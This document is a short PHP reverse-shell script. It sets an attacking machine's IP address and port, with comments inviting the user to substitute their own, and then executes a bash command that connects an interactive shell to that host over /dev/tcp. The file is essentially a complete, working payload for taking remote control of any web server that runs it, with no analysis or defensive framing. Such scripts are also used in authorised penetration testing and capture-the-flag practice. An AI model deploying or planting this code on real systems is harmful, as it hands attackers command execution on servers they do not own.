<?php
// Set the IP address and port of the attacking machine
$ip = '192.168.252.129';  // Replace with your attacking machine's IP
$port = 1234;          // Replace with your desired port

// Command to execute a reverse shell
$command = "/bin/bash -c 'bash -i > /dev/tcp/$ip/$port 0>&1'";

// Execute the command
exec($command);
echo "command success";
?>
